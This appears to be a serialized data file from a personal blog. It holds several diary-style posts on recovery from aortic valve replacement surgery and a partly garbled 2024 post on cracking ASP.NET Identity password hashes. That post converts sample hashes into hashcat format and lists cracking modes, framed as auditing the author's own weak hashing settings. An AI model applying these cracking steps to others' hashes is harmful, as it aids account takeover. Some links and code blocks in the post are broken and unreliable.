post-operatively](https://www.ncbi.nlm.nih.gov/pmc/articles/PMC6016582/) as the heart adapts to improved haemodynamics, particularly in patients who had significant stenosis pre-operatively.\\n\\nIn my nightly medicine I received something extra which brought my heart rate down, and I slept well aside from the toilet visits. The anaesthetic and water retention play havoc with routine for several days, however I\'m just about able to get out of bed myself without too much pain, which is good progress.\\n\\nWaking up in pain during the night was sometimes confusing - it wasn\'t always clear whether the support jacket was sitting badly and pushing a sensor or wire into my skin, if muscles were doing something unusual, or if movement had annoyed the sternum. \\n\\nIt\'s only really today that I figured out for sure that the support jacket can cause discomfort, and just opening it for 5 minutes brings relief. I must be careful though - I wouldn\'t want to be moving, and more importantly coughing, while it\'s open, as that could risk the sternum.\\n\\nRegarding the muscles, sometimes it feels like I don\'t have the muscle strength in my neck and upper chest to raise my head. This is no big surprise - they will have been impacted by the operation, with surgeons having to work around and through chest muscles to access the heart.\\n\\nThe sternum pain is the easiest to understand, particularly if I cough a little in the night, as this produces the sharpest and shortest pain. While it remains intensely painful, it feels less than it was already - maybe partly because I know how to protect it better when coughing, maybe because as the swelling is reducing and healing is starting, or both.\\n\\n## Progress Notes\\n\\nThe transition to the normal ward marks a significant step in the recovery process. The focus on increased mobility and the positive echocardiogram results are encouraging signs that the heart is adapting well to the new valve.\\n\\n:::note\\nThis post and future recovery updates are being written with AI assistance (GitHub Copilot) to help me document the experience clearly and efficiently. Working with Copilot on my phone makes it difficult to make corrections myself, so some details may need refinement.\\n:::"},{"id":"/2025/10/07/day-4-move-to-normal-ward","metadata":{"permalink":"/docs/blog/2025/10/07/day-4-move-to-normal-ward","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2025-10-07-day-4-move-to-normal-ward.md","source":"@site/blog/2025-10-07-day-4-move-to-normal-ward.md","title":"Day 4 of Recovery - Moving to the Normal Ward","description":"Day 4 post-surgery: transitioning from intermediate care to the normal ward and continuing recovery.","date":"2025-10-07T00:00:00.000Z","tags":[{"inline":true,"label":"Heart","permalink":"/docs/blog/tags/heart"},{"inline":true,"label":"Surgery","permalink":"/docs/blog/tags/surgery"},{"inline":true,"label":"Recovery","permalink":"/docs/blog/tags/recovery"},{"inline":true,"label":"Aorta","permalink":"/docs/blog/tags/aorta"}],"readingTime":5.08,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Day 4 of Recovery - Moving to the Normal Ward","authors":["mark-burton"],"tags":["Heart","Surgery","Recovery","Aorta"],"description":"Day 4 post-surgery: transitioning from intermediate care to the normal ward and continuing recovery.","date":"2025-10-07"},"unlisted":false,"prevItem":{"title":"Day 5 - Progress on the Normal Ward","permalink":"/docs/blog/2025/10/07/day-6-normal-ward-progress"},"nextItem":{"title":"Days 2-3 Post-Surgery - Standing and Walking","permalink":"/docs/blog/2025/10/04/day-2-post-surgery-recovery"}},"content":"## Morning Routine in Intermediate Care\\n\\nThe pattern had become familiar by now - the night shift nurses arrived at 5:30 AM and had to wake me for the daily ECG. After another snooze, a whole new team of nurses arrived for the day shift. Unlike previous days, there was no X-ray scheduled today.\\n\\nI was gotten ready for the surgeon\'s visit, who arrived with a big team of doctors and students in tow. He asked me if I needed the oxygen anymore. I gave an honest shrug - \\"I don\'t know.\\" He told me he would check and, after confirming my oxygen levels were good, ordered the oxygen removed. Then came the good news: they were preparing a new room for me in the standard care ward.\\n\\n## The Move Across the Hall\\n\\nNo sooner had I finished my breakfast than a team of nurses arrived to move me to my new room. The journey wasn\'t far - all the way directly across the hall!\\n\\nThe transition brought several welcome changes:\\n\\n* **Oxygen line removed**: No longer needed, confirming my lungs were recovering well\\n* **Heart monitor upgrade**: The continual monitoring equipment shrank to a portable Phillips MX40-2C4 that I can carry around my neck. It still sends all the data to the central nurse station, but I\'m no longer tethered to a bedside machine\\n* **Mobile pacemaker**: I still have to carry this around as well, though they mentioned it would be removed in the next day or two\\n\\n## The Temporary Pacemaker\\n\\nThe mobile pacemaker I\'m carrying around is an Osypka Pace 203H - a German-made temporary external pacemaker commonly used after cardiac surgery. The device has electrode cables that were threaded through my chest wall into my heart during the operation, allowing the medical team to control my heart rate externally if needed.\\n\\nThe Osypka unit monitors and can pace my heart to maintain a steady rhythm during the critical early recovery phase. To my knowledge, it hasn\'t needed to actively pace yet, which is a good sign that my heart is maintaining its own rhythm well. The cables will be removed in the next day or two once the surgical team is confident everything is stable.\\n\\nI have to admit, when I first saw the name \\"Osypka\\" on the device, my mind immediately went to oscypek - that delicious Polish smoked sheep\'s cheese from the Tatra Mountains. At least if I\'m going to be tethered to a medical device, it can remind me of one of my favourite cheeses! Though I suspect the German engineer Dr. Peter Osypka who founded the company wasn\'t thinking about Polish mountain cheese when he named it.\\n\\n## Life in the Normal Ward\\n\\nNow I\'m in a nice quiet room alone. No more beeping machines, though there are still plenty of nurse visits, tests, and medicine to take. The quieter environment is a welcome change after the hectic intermediate care ward.\\n\\n## Physiotherapy and Breathing Exercises\\n\\nThe physio took me for a walk down the corridor, which went well. My mobility is improving daily.\\n\\nShe also gave me some more advanced breathing exercises to do, and I\'m now using my Mediflo Duo respiratory exerciser at level 3 of 5. These exercises are crucial because of the discomfort and reduced activity - the temptation is to breathe superficially, which is bad for recovery. Shallow breathing allows bad stuff to build up, leading to coughing (which rates 10 out of 10 on the pain scale, even in the special braced position) and worse possibilities like infection if I don\'t do the breathing exercises properly and keep my airways clear.\\n\\n\x3c!-- TODO: Add image of Mediflo Duo respiratory exerciser --\x3e\\n\\nThe Mediflo Duo is an incentive spirometer with adjustable resistance levels that helps improve lung capacity after surgery. Starting at level 3 indicates good progress - it provides enough resistance to challenge the lungs without being overwhelming during this early recovery phase.\\n\\nThe \\"special braced position\\" I mention is essential for managing pain during coughing, standing up, or sitting down. They provided me with a recovery gilet (a padded vest), and the technique is to fold your arms across your body with your hands tucked into your armpits, essentially hugging yourself tightly. This braces and supports the chest incision area, reducing the stress on the sternum and making movements much more bearable. Without this bracing technique, even simple movements would be excruciating.\\n\\n\x3c!-- TODO: Add illustrative image of bracing position with recovery gilet --\x3e\\n\\nDespite the pain, I\'m committed to doing the breathing exercises regularly. They\'re an essential part of preventing complications.\\n\\n## Progress Summary\\n\\nDay 5 marks a significant milestone in my recovery:\\n\\n* \u2705 Moved to normal ward\\n* \u2705 Oxygen support no longer needed\\n* \u2705 Portable monitoring equipment\\n* \u2705 Increased mobility with corridor walks\\n* \u2705 Advanced breathing exercises\\n* \u23f3 Temporary pacemaker still in place (removal soon)\\n\\nThe steady progression from intensive care to intermediate care and now to the normal ward shows good recovery. Each day brings more independence and fewer machines, though the vigilant medical monitoring continues to ensure everything heals properly.\\n\\n## Learning to Move Safely\\n\\nI should mention that I did manage to get myself into and out of bed on a couple of occasions today, but I don\'t recommend rushing this milestone. The movement requires not just getting upright, but also spinning around - a complex manoeuvre that puts considerable strain on the healing sternum.\\n\\nI\'ve decided to work with the nurses for a few more days to master the progression: first, sitting upright confidently; then, standing up by myself; and finally, the full bed transfer. Getting in and out of the chair using the brace is manageable now - the pain is fine. But the bed is still a bit much with that additional twisting motion required.\\n\\nI also realised I\'d been forgetting an important step: adjusting the bed controls to put it in the optimal position before attempting to get out. The right bed angle can make a significant difference in reducing pain and strain during the movement. It\'s these small techniques that the nursing staff know from experience, and it\'s worth taking the time to learn them properly rather than powering through with extra pain."},{"id":"/2025/10/04/day-2-post-surgery-recovery","metadata":{"permalink":"/docs/blog/2025/10/04/day-2-post-surgery-recovery","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2025-10-04-day-2-post-surgery-recovery.md","source":"@site/blog/2025-10-04-day-2-post-surgery-recovery.md","title":"Days 2-3 Post-Surgery - Standing and Walking","description":"Early morning tests, drainage tube removal, cannula removal, and my first walk.","date":"2025-10-04T00:00:00.000Z","tags":[{"inline":false,"label":"Health","permalink":"/docs/blog/tags/health","description":"Health and medical topics"},{"inline":false,"label":"Surgery","permalink":"/docs/blog/tags/surgery","description":"Surgical procedures and experiences"},{"inline":false,"label":"Heart","permalink":"/docs/blog/tags/heart","description":"Cardiac health and heart-related topics"},{"inline":false,"label":"Medical","permalink":"/docs/blog/tags/medical","description":"Medical topics and healthcare"},{"inline":true,"label":"recovery","permalink":"/docs/blog/tags/recovery"}],"readingTime":5.24,"hasTruncateMarker":true,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Days 2-3 Post-Surgery - Standing and Walking","authors":["mark-burton"],"tags":["health","surgery","heart","medical","recovery"],"description":"Early morning tests, drainage tube removal, cannula removal, and my first walk.","date":"2025-10-04"},"unlisted":false,"prevItem":{"title":"Day 4 of Recovery - Moving to the Normal Ward","permalink":"/docs/blog/2025/10/07/day-4-move-to-normal-ward"},"nextItem":{"title":"First Days After Surgery","permalink":"/docs/blog/2025/10/04/first-days-after-surgery"}},"content":"Saturday and Sunday, 5th-6th October 2025 - Days 2 and 3 after my aortic valve replacement surgery were remarkably similar, with continued progress in my recovery. From early morning monitoring through to standing up and eventually taking my first walk.\\n\\n\x3c!--truncate--\x3e\\n\\n## Day 2 - Saturday Morning\\n\\nThe day started early at 5:30 AM with an ECG whilst still in bed. This was followed by an X-ray around 7:00 AM, also conducted bedside. These morning tests are a routine part of post-operative monitoring to check heart function and lung condition after cardiac surgery.\\n\\n## Drainage Tube Removal\\n\\nThe surgeon came to visit and confirmed that my drainage tube would be removed. The drainage tube had been collecting excess fluid from around the surgical site, and its removal is a significant milestone in the recovery process.\\n\\nThe removal itself felt rather gross as it was pulled out - there\'s simply no way to make extracting a tube from your chest comfortable. However, almost instantly I could breathe easier with much less pain. The difference was remarkable and immediate.\\n\\n## Breathing Exercises\\n\\nI worked with my breathing machine (incentive spirometer) both before and after the drainage tube was removed. The difference was huge. With the tube in place, each breath had been limited by discomfort and the physical presence of the tube. Once removed, my lung capacity improved dramatically.\\n\\nA little later, the physiotherapist came for our session. It was amazing how much better my breathing was compared to yesterday\'s sessions. The improvement in lung function after drainage tube removal was substantial and encouraging.\\n\\n## First Time Standing\\n\\nLunch came around at 12:30. Whilst the nurse helped me swing my legs off the bed, I stood up under my own power for the first time since surgery. This is a crucial milestone in cardiac recovery - getting vertical helps with circulation, breathing, and reducing the risk of complications from prolonged bed rest.\\n\\nThe nursing staff were supportive throughout, ensuring I moved safely whilst encouraging independence where possible.\\n\\n## Saturday Night - Water Retention Management\\n\\nOn Saturday night (whilst I still had the neck cannula in place), the doctor decided to start me on an infusion of [Lasix](https://en.wikipedia.org/wiki/Furosemide) (furosemide), a diuretic medication, to address my water retention. That meant not much sleep that night as I kept filling the pee bottle and buzzing the nurses for new ones.\\n\\n## Day 3 - Sunday Morning - Freedom from Lines\\n\\nOn Sunday, the biggest milestone was the removal of the remaining cannula from my neck. Based on how it felt coming out, I assume it was something quite sizeable - likely a [Central Venous Catheter (CVC)](https://en.wikipedia.org/wiki/Central_venous_catheter), which is typically inserted into the internal jugular vein in the neck to provide central venous access during and after cardiac surgery.\\n\\nThe nurse instructed me: \\"Count to three and breathe in, then hold your breath.\\" No mean feat, holding your breath after open heart surgery, I can tell you. Then he pulled out what felt like a couple of centimetres. The sensation was quite remarkable.\\n\\nWith that removal, I was finally totally free from all lines and tubes. All medication was now oral, except for anticoagulants and anti-thrombosis injections administered in my belly, and blood samples taken from my arm rather than through a central line.\\n\\n## Managing Water Retention - Day 3\\n\\nDuring Sunday, I was given a tablet-based dose of Lasix instead of the infusion. This had me regularly peeing into a measuring bottle so they could track how much of my retained water I was managing to eliminate. I was thankfully looking somewhat like myself by the end of the day. The tablet approach was much better planned - it allowed me to stop peeing by about 20:00 so I could sleep well.\\n\\nOne side effect of Lasix is losing potassium, so I had potassium drinks - tablets dissolved into water. Whatever they were, they had not bothered with the flavouring. Cold, fizzy horribleness. A bit like the first beer I tried to brew.\\n\\n## Overcoming Needle Anxiety\\n\\nI must say, having been afraid of needles all my life - I blame a bad experience at the doctor\'s surgery with a doctor who went to the same church as us and lived on the same street, making them unavoidable - all of the tests over the last couple of years have been pretty much painless and mostly without so much as a bruise.\\n\\nThe team at INCCI (Cardiac Intensive Care) at Strassen CHL have looked after me so well. I still close my eyes when there\'s a needle, but I\'m not sure why anymore. The fear has diminished significantly through positive experiences.\\n\\n## First Walk\\n\\nBeing free from all of the machines meant that I could go for my first walk. It was a very short one - maybe 20 metres there and back along the corridor - but it was a walk, and another significant milestone in my recovery. Every step, quite literally, was progress.\\n\\n## Sunday Evening Exhaustion\\n\\nAt the end of Sunday, I very quickly got tired and was asleep by 21:00. I slept so soundly that I slept through at least three hourly automated blood pressure tests - which are noisy affairs - and even the visit of the night staff at shift change.\\n\\n## Middle of the Night Pain\\n\\nAt 01:00, I woke up with quite intense pain. I pressed the buzzer and the nurse arrived quickly. She gave me a tiny cup of medicine with a small amount of liquid in it to drink and told me everything was normal. Soon after, I was dozing again until it was shift change time.\\n\\n## Recovery Progress\\n\\nAccording to the expected timeline from my [pre-surgery post](/blog/2025-09-30-preparation-and-hospital-admission-day), Days 2-3 involve continued ICU care with progressive mobilisation. Standing up on day 2 and walking on day 3 marks excellent progress towards that goal.\\n\\nEach small step forward - the tube removal, improved breathing, standing up, walking - builds confidence and demonstrates that the recovery is progressing as planned.\\n\\n:::note\\nThis post and future recovery updates are being written with AI assistance (GitHub Copilot) to help me document the experience clearly and efficiently. Working with Copilot on my phone makes it difficult to make corrections myself, so some details may need refinement.\\n:::"},{"id":"/2025/10/04/first-days-after-surgery","metadata":{"permalink":"/docs/blog/2025/10/04/first-days-after-surgery","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2025-10-04-first-days-after-surgery.md","source":"@site/blog/2025-10-04-first-days-after-surgery.md","title":"First Days After Surgery","description":"The initial days of recovery following aortic valve replacement surgery.","date":"2025-10-04T00:00:00.000Z","tags":[{"inline":true,"label":"Heart","permalink":"/docs/blog/tags/heart"},{"inline":true,"label":"Surgery","permalink":"/docs/blog/tags/surgery"},{"inline":true,"label":"Recovery","permalink":"/docs/blog/tags/recovery"},{"inline":true,"label":"Aorta","permalink":"/docs/blog/tags/aorta"}],"readingTime":2.19,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"First Days After Surgery","authors":["mark-burton"],"tags":["Heart","Surgery","Recovery","Aorta"],"description":"The initial days of recovery following aortic valve replacement surgery.","date":"2025-10-04"},"unlisted":false,"prevItem":{"title":"Days 2-3 Post-Surgery - Standing and Walking","permalink":"/docs/blog/2025/10/04/day-2-post-surgery-recovery"},"nextItem":{"title":"Preparation and Hospital Admission Day","permalink":"/docs/blog/2025/09/30/preparation-and-hospital-admission-day"}},"content":"## Post-Operation Day: Thursday, 3rd October\\n\\nThe first thing I was aware of after the operation was being extubated - not a nice experience, but I wasn\'t really very aware. My first comments, which nearly came out croaky because of the tube affecting my vocal chords, were \\"I\'m alive\\" and \\"Is it Thursday?\\" Knowing if it wasn\'t Thursday, there must have been problems and I\'d have an extra concerned family. As it happens, everything went smoothly, although my surgeon has since told me I had one of the worst aortic valves he ever operated on.\\n\\nAfter that I was mostly asleep, only rousing to urgently apologise for snoring a couple of times and to ask what time it was - 2am and 4am.\\n\\n## First Full Day: Friday, 4th October\\n\\n### Morning in Intensive Care\\n\\nThe next morning started with an X-ray in bed and some of the tubes being removed. I had two in my neck and two in my arm. Over the course of the morning, that reduced to just one in my neck.\\n\\nI was dragged out of bed and sat up in a chair for breakfast and for a few hours after. The physio came to see me whilst I was sat in the chair and I did the first breathing exercises, which was very painful. The surgeon visited and explained everything went well and I was making good progress, so I would be out of the reanimation (intensive care) ward that day.\\n\\nAt 12:00, lunch was served - fish, of course, being a Friday in a Catholic country.\\n\\nBy 13:00, they had removed the urinary catheter. That wasn\'t pleasant at all - burny and felt like I was going to need to pee straight away. They said it would feel like a urinary tract infection, something that I have no reference point for.\\n\\n### Moving to Intermediate Care\\n\\nFrom 13:00, I was in intermediate care. Lots of monitoring going on, so quite hectic and noisy. I was overall in a much better state than I imagined I would be and had my first visitor. We did similar breathing exercises with the physio in the afternoon.\\n\\nHowever, through the afternoon and evening the pain gradually increased. The pain I needed the extra medication for was mainly brought on by trying to breathe - quite a scary sensation as my breaths got shorter and shorter to avoid the pain, mainly around the chest drainage site. I buzzed the nurses for more pain relief, and it took two shots, but they made me comfortable and I slept well today, apart from the hourly blood pressure checks which startled me every time."},{"id":"/2025/09/30/preparation-and-hospital-admission-day","metadata":{"permalink":"/docs/blog/2025/09/30/preparation-and-hospital-admission-day","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2025-09-30-preparation-and-hospital-admission-day.md","source":"@site/blog/2025-09-30-preparation-and-hospital-admission-day.md","title":"Preparation and Hospital Admission Day","description":"My hospital admission experience and preparation for aortic valve replacement surgery.","date":"2025-09-30T00:00:00.000Z","tags":[{"inline":false,"label":"Health","permalink":"/docs/blog/tags/health","description":"Health and medical topics"},{"inline":false,"label":"Surgery","permalink":"/docs/blog/tags/surgery","description":"Surgical procedures and experiences"},{"inline":false,"label":"Heart","permalink":"/docs/blog/tags/heart","description":"Cardiac health and heart-related topics"},{"inline":false,"label":"Medical","permalink":"/docs/blog/tags/medical","description":"Medical topics and healthcare"}],"readingTime":3.95,"hasTruncateMarker":true,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Preparation and Hospital Admission Day","authors":["mark-burton"],"tags":["health","surgery","heart","medical"],"description":"My hospital admission experience and preparation for aortic valve replacement surgery.","date":"2025-09-30"},"unlisted":false,"prevItem":{"title":"First Days After Surgery","permalink":"/docs/blog/2025/10/04/first-days-after-surgery"},"nextItem":{"title":"Untitled","permalink":"/docs/blog/2024/03/10/cracking-aspnet-identity-password-hashes"}},"content":"Today I was admitted to hospital for aortic valve replacement surgery. After years of monitoring my bicuspid aortic valve and watching the stenosis gradually worsen, the time has come for the operation I\'ve known was inevitable since childhood.\\n\\n\x3c!--truncate--\x3e\\n\\n## The Lead-Up\\n\\nAs I mentioned in my [previous post about getting a new aortic valve](/blog/2025-09-28-getting-a-new-aortic-valve), I was born with a bicuspid aortic valve instead of the normal tricuspid valve. Over the years, the progressive stenosis has reached a point where replacement is necessary to maintain proper heart function.\\n\\nThe past few weeks have been filled with pre-operative assessments, consultations with the cardiac surgery team, and various medical tests to ensure everything is ready for tomorrow\'s admission.\\n\\n## Pre-Operative Preparations\\n\\nIn the weeks leading up to admission, I completed all the required preparations. The hospital bag was packed with comfortable clothing and essentials. Work was handed over to colleagues, meals were prepped and frozen at home, and all the important documents were organized.\\n\\nMentally, I felt calm and confident. I\'d watched surgical videos, read patient experiences, and spoken with others who\'d been through this procedure. While it\'s natural to feel some anxiety about major heart surgery, knowing this is a routine procedure performed thousands of times each year with excellent outcomes was reassuring.\\n\\n## Hospital Check-In - 13:00\\n\\nCheck-in was prompt and efficient. The cardiac ward staff were welcoming and immediately got to work with the pre-operative assessments:\\n\\n* **Blood pressure**: 150/80 - slightly elevated but expected given the circumstances\\n* **Blood tests**: Taken for final clotting factors and general health markers\\n* **Chest X-ray**: Completed to check heart size and lung condition\\n\\nThroughout the afternoon, I was visited by various members of the surgical team, each explaining their role in tomorrow\'s procedure:\\n\\n* **Surgical assistant**: Walked through the procedure timeline and what to expect\\n* **Anaesthesiologist**: Discussed anaesthesia plan and post-operative pain management\\n* **Surgeon**: The most important conversation - explaining the surgical approach\\n\\n## The Surgical Plan\\n\\nThe surgeon brought excellent news. Instead of the full median sternotomy I\'d been preparing for, they\'ll use a partial sternotomy - a smaller incision with only a partial cut of the sternum. This minimally invasive approach means quicker healing and reduced risk of complications.\\n\\n## Evening Preparations\\n\\nThe pre-surgery preparations continued through the evening:\\n\\n* **Dental hygiene**: Toothbrush and mouthwash for oral care\\n* **Hair removal**: For cleanliness and surgical site preparation\\n* **Microlax**: Bowel preparation to keep things comfortable post-surgery\\n* **Isobetadine shower**: A thorough shower with isobetadine soap - dark red in colour but washes off without staining\\n* **Xanax**: Prescribed to help ensure a good night\'s sleep before the operation\\n\\n## Pre-Surgery Schedule\\n\\n* **18:00**: Light meal - my last food before surgery\\n* **22:00**: Nothing to eat or drink after this time\\n\\nI was given a bottle of water to stay hydrated through the evening.\\n\\n\x3c!-- Image placeholder: Pre-surgery evening meal --\x3e\\n\\n## Surgery Day Morning\\n\\n* **05:00**: Wake up for second isobetadine shower\\n* **Blood pressure**: 123/78 - back to more normal levels for me\\n* **More Xanax**: Additional dose for pre-surgery relaxation\\n* **08:00**: Surgery start time\\n\\n## The Procedure\\n\\nAt 8:00 AM, the team will:\\n\\n* Connect me to the heart-lung bypass machine\\n* Remove the diseased bicuspid valve\\n* Sew in the new prosthetic valve\\n* Transfer me to ICU for initial recovery\\n\\nFor technical details on traditional valve replacement, see my [previous post](/blog/2025-09-28-getting-a-new-aortic-valve).\\n\\n## Expected Recovery Timeline\\n\\nThe cardiac team outlined an ambitious recovery plan:\\n\\n* **Day 1 (Post-op)**: In ICU, start rehabilitation - sit up and eat breakfast\\n* **Days 2-3**: Continued ICU care, progressive mobilization\\n* **Days 3-4**: Transfer to intermediate care\\n* **Week 1**: Move to cardiac ward\\n* **Day 10**: Transfer to cardiologist\'s care\\n* **Days 10-14**: Final hospital days under cardiology\\n* **Weeks 2+**: Home recovery, gradually increasing activity\\n\\n## Following My Progress\\n\\nI won\'t have access to my phone during surgery and initial recovery. The next update will be in a few days once I\'m able to write again.\\n\\nYou can follow along by subscribing to the [RSS feed](/feed.rss) or checking back here for updates.\\n\\n:::note\\nThis post and future recovery updates are being written with AI assistance (GitHub Copilot) to help me document the experience clearly and efficiently. Working with Copilot on my phone makes it difficult to make corrections myself, so some details may need refinement.\\n:::\\n\\n## Evening Reflections\\n\\nIt\'s now evening in the cardiac ward. The nursing staff have been excellent, the ward is quiet and well-run, and I have complete confidence in tomorrow\'s procedure.\\n\\nModern cardiac surgery truly is remarkable. I\'m grateful for the skilled team and for living in an era where this life-changing procedure is routine.\\n\\nSee you on the other side!"},{"id":"/2024/03/10/cracking-aspnet-identity-password-hashes","metadata":{"permalink":"/docs/blog/2024/03/10/cracking-aspnet-identity-password-hashes","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2024-03-10-cracking-aspnet-identity-password-hashes.md","source":"@site/blog/2024-03-10-cracking-aspnet-identity-password-hashes.md","title":"Untitled","description":"I was reviewing one of my old sample projects codebase which makes use of asp.net Identity for storage of users and passwords, in the startup I noticed the following code:","date":"2024-03-10T00:00:00.000Z","tags":[],"readingTime":3.41,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Untitled","authors":["mark-burton"],"date":"2024-03-10"},"unlisted":false,"prevItem":{"title":"Preparation and Hospital Admission Day","permalink":"/docs/blog/2025/09/30/preparation-and-hospital-admission-day"},"nextItem":{"title":"Untitled","permalink":"/docs/blog/2024/01/10/creating-a-chatbot-with-llm-rag"}},"content":"I was reviewing one of my old sample projects [codebase which makes use of asp.net Identity](https://github.com/MarkZither/SwaggerAndHealthCheckBlog/blob/33d032bcc0a0fc7ee042f9059adb03088c540d99/src/LoginService/Startup.cs#L39) for storage of users and passwords, in the startup I noticed the following code:\\n\\n```csharp\\nservices.Configure<PasswordHasherOptions>(options => {\\n  options.CompatibilityMode = PasswordHasherCompatibilityMode.IdentityV2;\\n});\\n```  This can be used to migrate from older versions of asp.net Identity and Identity Server using asp.net Identity to the latest version without needing to handle the migration of users passwords to the new hashing algorithm. That is good for ease of development, but should the hashes get into the wrong hands they will be easier to crack.\\n\\nThe PasswordHasher code can be read in the [AspNetCore GitHub repo](https://github.com/dotnet/AspNetCore/blob/main/src/Identity/Extensions.Core/src/PasswordHasher.cs).\\n\\nThe comments at the top of that file explain the 2 different hashing algorithms supported by the default password hasher implementation. This shows that V2 is a relatively weak hash with a small number of iterations, whereas V3 is now SHA-512 with 100,000 iterations after being SHA-256 with . This is recent update\\n\\n```csharp\\n/*\\n * =======================\\n * HASHED PASSWORD FORMATS\\n * =======================\\n *\\n * Version 2:\\n * PBKDF2 with HMAC-SHA1, 128-bit salt, 256-bit subkey, 1000 iterations.\\n * (See also: SDL crypto guidelines v5.1, Part III)\\n * Format: { 0x00, salt, subkey }\\n *\\n * Version 3 (.net 7 and above):\\n * PBKDF2 with HMAC-SHA512, 128-bit salt, 256-bit subkey, 100000 iterations.\\n * Format: { 0x01, prf (UInt32), iter count (UInt32), salt length (UInt32), salt, subkey }\\n * (All UInt32s are stored big-endian.)\\n *\\n * Version 3 (.net 6 and below):\\n * PBKDF2 with HMAC-SHA256, 128-bit salt, 256-bit subkey, 10000 iterations.\\n * Format: { 0x01, prf (UInt32), iter count (UInt32), salt length (UInt32), salt, subkey }\\n * (All UInt32s are stored big-endian.)\\n */\\n```  In 2014 Brock Allen wrote the post [How MembershipReboot stores passwords properly](https:/brockallen.com20140209how-membershipreboot-stores-passwords-properly) where it was written;  > This means in 2012 we should have been using 64000 iterations and in 2014 we should be using 128000 iterations. As previously mentioned, this is hardware dependent and the real target is 500 to 1000 milliseconds.  The code in the MembershipReboot repo suggests that did not remain correct and in 2018 the default was set to 50,000.  In 2017 NIST published the following guidance [800-63B\\nDigital Identity Guidelines - Authentication and Lifecycle Management](https:/pages.nist.gov800-63-3sp800-63b.html)  > The salt SHALL be at least 32 bits in length and be chosen arbitrarily so as to minimize salt value collisions among stored hashes. Both the salt value and the resulting hash SHALL be stored for each subscriber using a memorized secret authenticator.  > For PBKDF2, the cost factor is an iteration count: the more times the PBKDF2 function is iterated, the longer it takes to compute the password hash. Therefore, the iteration count SHOULD be as large as verification server performance will allow, typically at least 10,000 iterations.  With that, lets try and crack these password hashes, we have a salted hash, so how easy can it be to crack such a password?  ## Converting the hash into hashcat format  There are many tools in various languages to convert the base64 encoded password hash into a format hashcat can crack.  Based on 2 different GitHub repos I created Replits to cover the V2 and V3 asp.net Identity hashing algorithms.  ### Replit base64 encoded V2 hash to hashcat format\\n[Replit aspnet Identity V2 to Hashcat](https:/replit.com@markburton2aspnetIdentityV2ToHashcat#main.py)  `python main.py -i base64hash -o out`  `AAR65WvZryqTHSnKGfH+D6aInhFCZfk2khdye+6PMdRiVeG2Ai9eBtErYndhtu6Iw==`  `sha1:1000:BHrla9mvKpMdKcr8Z8f4Pg==:miJ4RQmX5NpIXcnvujzHUYlXhtgIvXgbRK2J3YbbuiM=`  `12000 PBKDF2-HMAC-SHA1`  ### Replit base64 encoded V3 hash to hashcat format\\nhttps:/replit.com@markburton2aspnetIdentityToHashcat#main.cs  `sha256:10000:bvHHyyaHNxgVoCE9JGPWuA==:MXwKKigb+FjP+EfmdErxcbcbjJH4AUtvKdTEM71dDnk=`  ``` csharp  ```  https:/github.comNetDevPackNetDevPackblobmastersrcNetDevPackUtilitiesAspNetIdentityHashInfo.cs\\n``` csharp  ```  https:/hashcat.netwikidoku.php?id=example_hashes  `10900\\tPBKDF2-HMAC-SHA256\\tsha256:1000:MTc3MTA0MTQwMjQxNzY=:PYjCU215Mi57AYPKva9j7mvF4Rc5bCnt`  `12100\\tPBKDF2-HMAC-SHA512\\tsha512:1000:ODQyMDEwNjQyODY=:MKaHNWXUsuJB3IEwBHbm3w==`  ## Dotnet Global tool  I wanted to be able to look at my databases and check what the hashes were so I created a dotnet tool with the knowledge gained from the previous libraries. [](https:/www.nuget.orgpackagesNallixion.ASPNET.Identity.HashDecoder)  ``` powershell\\ndotnet tool install --global Nallixion.ASPNET.Identity.HashDecoder --version 0.0.1-alpha.1\\n```  ## Hashing rate on a VM on my laptop  This is far from what a machine with a GPU could achieve."},{"id":"/2024/01/10/creating-a-chatbot-with-llm-rag","metadata":{"permalink":"/docs/blog/2024/01/10/creating-a-chatbot-with-llm-rag","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2024-01-10-creating-a-chatbot-with-llm-rag.md","source":"@site/blog/2024-01-10-creating-a-chatbot-with-llm-rag.md","title":"Untitled","description":"I wanted to understand more about how ChatGPT and Co-Pilots like those from GitHub and Pieces work and how I could do something similar including private content, whilst reading around the topic I read the article Demystifying Retrieval Augmented Generation with .NET and thought it described what I wanted to achieve so decided to follow along.  The first challenge I encountered was that Azure OpenAI Service is only available for \\"eligible customers and partners\\" which, for my personal projects, I do not qualify. That is not a problem though as Stephan explains in the post it is trivial to switch to OpenAI which offers a free quota of $5 per month.  Next issue was that the code examples did not compile, this seems to be because the Semantic Kernel library has moved on from version 0.24 to 1.0.1 since the post was written. Some of the the changes are covered in the post [Saying hello to Microsoft Semantic Kernel V1","date":"2024-01-10T00:00:00.000Z","tags":[],"readingTime":2.21,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Untitled","authors":["mark-burton"],"date":"2024-01-10"},"unlisted":false,"prevItem":{"title":"Untitled","permalink":"/docs/blog/2024/03/10/cracking-aspnet-identity-password-hashes"},"nextItem":{"title":"Untitled","permalink":"/docs/blog/2023/12/22/hands-on-with-kiota"}},"content":"I wanted to understand more about how ChatGPT and Co-Pilots 